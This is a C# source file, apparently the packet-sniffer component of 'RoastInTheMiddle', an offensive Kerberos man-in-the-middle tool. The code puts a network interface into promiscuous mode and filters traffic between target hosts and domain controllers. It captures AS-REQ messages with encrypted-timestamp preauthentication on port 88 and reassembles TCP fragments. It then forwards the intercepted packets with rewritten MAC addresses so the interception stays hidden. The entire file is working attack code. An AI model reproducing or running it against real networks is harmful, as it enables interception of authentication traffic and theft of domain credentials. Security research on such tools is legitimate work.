using System;
using System.IO;
using System.Net;
using SharpPcap;
using RoastInTheMiddle.Lib.Krb;
using System.Collections.Generic;
using System.Net.NetworkInformation;
using System.Text.RegularExpressions;

namespace RoastInTheMiddle.Lib
{
    public class Sniffer
    {
        private static IPAddress localIP { get; set; }

        private static IPAddress dcIP { get; set; }

        private static IPAddress target { get; set; }

        private static ILiveDevice captureDevice { get; set; }

        private static Dictionary<string, IPAddress> connections { get; set; }

        public static void Start(string snifferIP)
        {
            connections = new Dictionary<string, IPAddress>();

            if (Program.shared["capture_device"] == null)
            {
                throw new System.Exception("Capture device not connected!");
            }

            captureDevice = (ILiveDevice)Program.shared["capture_device"];
            localIP = IPAddress.Parse(snifferIP);
            Random rnd = new Random();

            int r = rnd.Next(((List<IPAddress>)Program.shared["dcs"]).Count);
            dcIP = ((List<IPAddress>)Program.shared["dcs"])[r];

            if (Program.verbose)
            {
                Console.WriteLine($"[*]   SNIFFER: Using interface with IP: {localIP} and MAC address: {captureDevice.MacAddress}");
            }

            captureDevice.OnPacketArrival += new PacketArrivalEventHandler(ProcessPackets);

            int readTimeoutMilliseconds = 1000;
            captureDevice.Open(DeviceModes.Promiscuous, readTimeoutMilliseconds);

            // filter to capture traffic to/from mitm targets
            string macAddress = Regex.Replace(captureDevice.MacAddress.ToString(), ".{2}", "$0:");
            string filter = $"ip and not host {localIP} and ether dst {macAddress.Substring(0,macAddress.Length - 1)} and (";
            filter += string.Format("host {0}", string.Join(" or host ", (List<IPAddress>)Program.shared["dcs"]));
            filter += string.Format(" or host {0})", string.Join(" or host ", (List<IPAddress>)Program.shared["targets"]));
            if (Program.verbose)
            {
                Console.WriteLine($"[*]   SNIFFER: Using filter: {filter}");
            }
            captureDevice.Filter = filter;

            captureDevice.StartCapture();
        }

        public static void ProcessPackets(object sender, PacketCapture e)
        {
            bool forwardPacket = true;
            var rawPacket = e.GetPacket();

            var packet = PacketDotNet.Packet.ParsePacket(rawPacket.LinkLayerType, rawPacket.Data);

            var ethPacket = packet.Extract<PacketDotNet.EthernetPacket>();
            var ipPacket = packet.Extract<PacketDotNet.IPPacket>();

            byte[] packetData = null;
            ushort destPort = 0;
            ushort srcPort = 0;
            if (Program.shared["captured"] == null && ipPacket.Protocol is PacketDotNet.ProtocolType.Tcp)
            {
                var tcpPacket = packet.Extract<PacketDotNet.TcpPacket>();
                if (tcpPacket.HasPayloadData)
                {
                    if (tcpPacket.HasPayloadData)
                    {
                        packetData = tcpPacket.PayloadData;
                    }
                    destPort = tcpPacket.DestinationPort;
                    srcPort = tcpPacket.SourcePort;
                }
            }
            if (Program.shared["captured"] == null && ipPacket.Protocol is PacketDotNet.ProtocolType.Udp)
            {
                var udpPacket = packet.Extract<PacketDotNet.UdpPacket>();
                destPort = udpPacket.DestinationPort;
                srcPort = udpPacket.SourcePort;
                if (udpPacket.HasPayloadData)
                {
                    packetData = udpPacket.PayloadData;
                }
            }

            if (Program.shared["captured"] == null && (destPort == 88 || srcPort == 88) && packetData != null && packetData.Length > 3)
            {
                byte[] recordData = null;
                try
                {
                    BinaryReader br = new BinaryReader(new MemoryStream(packetData));

                    int recordMark = IPAddress.NetworkToHostOrder(br.ReadInt32());
                    int recordSize = recordMark & 0x7fffffff;

                    if (recordSize == (packetData.Length - 4))
                    {
                        try
                        {
                            recordData = br.ReadBytes(recordSize);
                        }
                        catch
                        {
                            recordData = null;
                        }
                    }
                    else if (destPort == 88 && ipPacket.Protocol is PacketDotNet.ProtocolType.Tcp)
                    {
                        if (Program.verbose)
                        {
                            Console.WriteLine($"[*]   SNIFFER: Storing packet from {srcPort} to {destPort} for later reassembly");
                        }
                        var tcpPacket = packet.Extract<PacketDotNet.TcpPacket>();
                        string key = $"{ipPacket.SourceAddress}:{srcPort}|{ipPacket.DestinationAddress}:{destPort}";
                        if (!((Dictionary<string, SortedDictionary<uint, PacketDotNet.EthernetPacket>>)Program.shared["reassemble"]).ContainsKey(key))
                        {
                            ((Dictionary<string, SortedDictionary<uint, PacketDotNet.EthernetPacket>>)Program.shared["reassemble"]).Add(key, new SortedDictionary<uint, PacketDotNet.EthernetPacket>());
                        }
                        ((Dictionary<string, SortedDictionary<uint, PacketDotNet.EthernetPacket>>)Program.shared["reassemble"])[key].Add(tcpPacket.SequenceNumber, ethPacket);
                        recordData = null;
                    }
                }
                catch (Exception ex)
                {
                    if (Program.verbose)
                    {
                        Console.WriteLine($"[!]   SNIFFER: Error: {ex.Message}\n{ex.StackTrace}\n\n");
                    }
                }

                if (recordData != null && Program.shared["captured"] == null && destPort == 88)
                {
                    try
                    {
                        AS_REQ asReq = new AS_REQ(recordData);

                        Console.WriteLine($"[*]   SNIFFER: Got AS-REQ for user {string.Join("@", asReq.req_body.cname.name_string)}@{asReq.req_body.realm} to service {string.Join("/", asReq.req_body.sname.name_string)}");

                        // only use AS-REQ's with preauth, accounts without preauth don't require MitM
                        foreach (var padata in asReq.padata)
                        {
                            if (padata.type is Interop.PADATA_TYPE.ENC_TIMESTAMP)
                            {
                                Program.shared["captured"] = asReq;
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        if (Program.verbose)
                        {
                            Console.WriteLine($"[!]   SNIFFER: Error parsing: {ex.Message}\n{ex.StackTrace}\n\n");
                        }
                    }
                }
            }

            if (forwardPacket)
            {
                ethPacket.SourceHardwareAddress = captureDevice.MacAddress;
                if (((Dictionary<IPAddress, PhysicalAddress>)Program.shared["resolved"]).ContainsKey(ipPacket.DestinationAddress))
                {
                    ethPacket.DestinationHardwareAddress = ((Dictionary<IPAddress, PhysicalAddress>)Program.shared["resolved"])[ipPacket.DestinationAddress];
                    ethPacket.UpdateCalculatedValues();

                    captureDevice.SendPacket(ethPacket);
                }
            }
        }
    }
}
